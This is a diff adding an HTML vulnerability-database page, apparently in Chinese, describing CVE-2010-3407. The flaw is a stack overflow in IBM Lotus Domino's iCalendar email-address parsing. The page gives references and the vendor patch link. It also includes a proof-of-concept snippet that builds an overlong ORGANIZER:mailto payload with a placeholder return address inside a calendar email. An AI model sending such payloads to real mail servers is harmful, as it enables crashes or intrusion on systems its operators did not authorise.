@@ -1,0 +1,317 @@
+
+<!DOCTYPE html>
+
+<html>
+
+	<head>
+
+		<meta charset="utf-8">
+
+        <link rel="stylesheet" href="/vulbox/source/table.css" />
+
+	</head>
+
+	<body class="dialog">
+
+		<div class="content">
+
+			<div class="wrap">
+
+				<div class="cont">
+
+					<table class="table table-hover table-mc-light-blue" style="margin-top: 0;">
+
+						<thead>
+
+							<tr class="first_title">
+
+								<th colspan="2">漏洞描述</th>
+
+							</tr>
+
+						</thead>
+
+						<tbody>
+
+							<tr>
+
+								<th width="70">漏洞名称</th>
+
+								<td>
+
+								    <img style="float:left;" src="/vulbox/source/h.gif" align="absmiddle"/>
+
+								<span style="float:left;margin-top:1px;margin-top:2px\9;">IBM Lotus Domino iCalendar邮件地址解析栈溢出漏洞</span>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th valign="top">详细描述</th>
+
+								<td valign="top">
+
+									Lotus Domino是集电子邮件、文档数据库、快速应用开发技术以及Web技术为一体的电子邮件与群集平台。
+<br />
+
+<br />
+
+									Lotus Notes的nnotes.dll库中的MailCheck821Address()函数在使用Cstrcpy()函数拷贝邮件地址时存在栈溢出漏洞，远程攻击者在邮件中包含超长的ORGANIZER:mailto iCalendar头就可以触发这个溢出，导致执行任意代码。
+<br />
+
+<br />
+
+									&lt;*来源：A. Plaskett
+<br />
+
+<br />
+
+									  链接：http://secunia.com/advisories/41433/
+<br />
+
+									        http://marc.info/?l=full-disclosure&amp;m=128449383412662&amp;w=2
+<br />
+
+									        http://labs.mwrinfosecurity.com/files/Advisories/mwri_lotus-domino-ical-stack-overflow_2010-09-14.pdf
+<br />
+
+									*&gt;
+<br />
+
+<br />
+
+									测试方法：
+<br />
+
+									--------------------------------------------------------------------------------
+<br />
+
+<br />
+
+									警 告
+<br />
+
+<br />
+
+									以下程序(方法)可能带有攻击性，仅供安全研究与教学之用。使用者风险自负！
+<br />
+
+<br />
+
+									ret_address = “BBBB”
+<br />
+
+									overflow = (&quot;A&quot; * 2374) + ret_address + (&quot;C&quot; * 6632)
+<br />
+
+									organiser = &quot;ORGANIZER:mailto:H@%s.com&quot; % overflow
+<br />
+
+									body = &quot;Content-Type: text/calendar; method=COUNTER; charset=&quot;UTF-8&quot;
+<br />
+
+									Subject: sent_mail2.txt
+<br />
+
+									MIME-Version: 1.0
+<br />
+
+									Content-Transfer-Encoding: 8bit
+<br />
+
+									BEGIN:VCALENDAR
+<br />
+
+									METHOD:COUNTER
+<br />
+
+									PRODID:-//HGOPO@VDGCOHBCOGHRO@GQHOOPGHHCCCGCBGGCLGMCPN//
+<br />
+
+									VERSION:2.0
+<br />
+
+									BEGIN:VEVENT
+<br />
+
+									UID:KORBOOGGGOHGNIH
+<br />
+
+									SEQ:2
+<br />
+
+									RRULE:aaaa
+<br />
+
+									%s
+<br />
+
+									ATTENDEE;:Mailto:aaaa@localdomain
+<br />
+
+									SUMMARY:PGOMG@OMPGR@KOFMEOPNCMH
+<br />
+
+									DTSTART:20091130T093000Z
+<br />
+
+									DTEND:20091130T093000Z
+<br />
+
+									DTSTAMP:20091130T083147Z
+<br />
+
+									LOCATION:Location
+<br />
+
+									STATUS:aaaa
+<br />
+
+									END:VEVENT
+<br />
+
+									END:VCALENDAR
+<br />
+
+									“”” % organiser<br />
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th  valign="top">解决方案</th>
+
+								<td valign="top">
+
+									目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：
+<br />
+
+<br />
+
+									http://www-01.ibm.com/support/docview.wss?uid=swg21446515<br />
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>威胁分值</th>
+
+								<td>9</td>
+
+							</tr>
+
+							<tr>
+
+								<th>危险插件</th>
+
+								<td>否</td>
+
+							</tr>
+
+							<tr>
+
+                                <th>发现日期</th>
+
+                                <td>2010-09-16</td>
+
+                            </tr>
+
+							<tr>
+
+                                <th>发布日期</th>
+
+                                <td>2011-05-31</td>
+
+                            </tr>
+
+							<tr>
+
+								<th>CVE</th>
+
+								<td>
+
+									<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3407" target="_blank">CVE-2010-3407</a>&nbsp;
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>BUGTRAQ</th>
+
+								<td>
+
+									<a href="http://www.securityfocus.com/bid/43219" target="_blank">43219</a>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>NSFOCUS</th>
+
+								<td>
+
+									<a href="http://www.nsfocus.net/index.php?act=sec_bug&do=view&bug_id=15752" target="_blank">15752</a>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>CNNVD编号</th>
+
+								<td>
+
+									CNNVD-201009-152&nbsp;&nbsp;
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>CNCVE编号</th>
+
+								<td>
+
+									CNCVE-20103407&nbsp;&nbsp;
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>CVSS评分</th>
+
+								<td>
+
+									9.3&nbsp;&nbsp;
+
+								</td>
+
+							</tr>
+
+						</tbody>
+
+					</table>
+
+				</div>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>
